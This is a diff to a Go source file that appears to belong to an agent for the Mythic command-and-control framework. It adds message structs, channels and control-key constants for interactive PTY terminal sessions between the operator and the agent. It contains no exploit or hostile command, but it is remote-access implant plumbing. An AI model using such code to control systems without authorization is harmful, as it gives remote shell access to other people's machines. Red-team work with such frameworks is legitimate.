@@ -304,12 +304,14 @@ type FileDownloadMessage struct {
 
 // Job struct holds channels and state for task execution including file transfers
 type Job struct {
-	Stop              *int
-	SendResponses     chan Response
-	SendFileToMythic  chan SendFileToMythicStruct
-	GetFileFromMythic chan GetFileFromMythicStruct
-	FileTransfers     map[string]chan json.RawMessage
-	FileTransfersMu   sync.RWMutex
+	Stop                        *int
+	SendResponses               chan Response
+	SendFileToMythic            chan SendFileToMythicStruct
+	GetFileFromMythic           chan GetFileFromMythicStruct
+	FileTransfers               map[string]chan json.RawMessage
+	FileTransfersMu             sync.RWMutex
+	InteractiveTaskInputChannel chan InteractiveMsg // Inbound from Mythic → task
+	InteractiveTaskOutputChannel chan InteractiveMsg // Outbound from task → Mythic
 }
 
 // SetFileTransfer safely adds a file transfer channel to the map
@@ -380,6 +382,49 @@ type SocksMsg struct {
 	Port     uint32 `json:"port,omitempty"`
 }
 
+// InteractiveMsg represents a single interactive tasking message exchanged with Mythic.
+// Used for bidirectional PTY/terminal streaming. Data is base64-encoded.
+type InteractiveMsg struct {
+	TaskID      string `json:"task_id"`
+	Data        string `json:"data"`         // base64-encoded payload
+	MessageType int    `json:"message_type"` // see InteractiveType constants
+}
+
+// Interactive message types (from Mythic docs).
+const (
+	InteractiveInput   = 0
+	InteractiveOutput  = 1
+	InteractiveError   = 2
+	InteractiveExit    = 3
+	InteractiveEscape  = 4
+	InteractiveCtrlA   = 5
+	InteractiveCtrlB   = 6
+	InteractiveCtrlC   = 7
+	InteractiveCtrlD   = 8
+	InteractiveCtrlE   = 9
+	InteractiveCtrlF   = 10
+	InteractiveCtrlG   = 11
+	InteractiveCtrlH   = 12 // Backspace
+	InteractiveCtrlI   = 13 // Tab
+	InteractiveCtrlJ   = 14
+	InteractiveCtrlK   = 15
+	InteractiveCtrlL   = 16
+	InteractiveCtrlM   = 17
+	InteractiveCtrlN   = 18
+	InteractiveCtrlO   = 19
+	InteractiveCtrlP   = 20
+	InteractiveCtrlQ   = 21
+	InteractiveCtrlR   = 22
+	InteractiveCtrlS   = 23
+	InteractiveCtrlT   = 24
+	InteractiveCtrlU   = 25
+	InteractiveCtrlV   = 26
+	InteractiveCtrlW   = 27
+	InteractiveCtrlX   = 28
+	InteractiveCtrlY   = 29
+	InteractiveCtrlZ   = 30
+)
+
 // CommandResult represents the result of executing a command
 type CommandResult struct {
 	Output      string
@@ -430,6 +475,7 @@ type TaskingMessage struct {
 	Socks       []SocksMsg        `json:"socks,omitempty"`
 	Rpfwd       []SocksMsg        `json:"rpfwd,omitempty"`
 	Delegates   []DelegateMessage `json:"delegates,omitempty"`
+	Interactive []InteractiveMsg  `json:"interactive,omitempty"`
 	// Add agent identification for checkin updates
 	PayloadUUID string `json:"uuid,omitempty"`
 	PayloadType string `json:"payload_type,omitempty"`
@@ -438,12 +484,13 @@ type TaskingMessage struct {
 
 // PostResponseMessage represents posting a response back to Mythic
 type PostResponseMessage struct {
-	Action    string                 `json:"action"`
-	Responses []Response             `json:"responses"`
-	Socks     []SocksMsg             `json:"socks,omitempty"`
-	Rpfwd     []SocksMsg             `json:"rpfwd,omitempty"`
-	Delegates []DelegateMessage      `json:"delegates,omitempty"`
-	Edges     []P2PConnectionMessage `json:"edges,omitempty"`
+	Action      string                 `json:"action"`
+	Responses   []Response             `json:"responses"`
+	Socks       []SocksMsg             `json:"socks,omitempty"`
+	Rpfwd       []SocksMsg             `json:"rpfwd,omitempty"`
+	Delegates   []DelegateMessage      `json:"delegates,omitempty"`
+	Interactive []InteractiveMsg       `json:"interactive,omitempty"`
+	Edges       []P2PConnectionMessage `json:"edges,omitempty"`
 }
 
 // Command interface for all commands
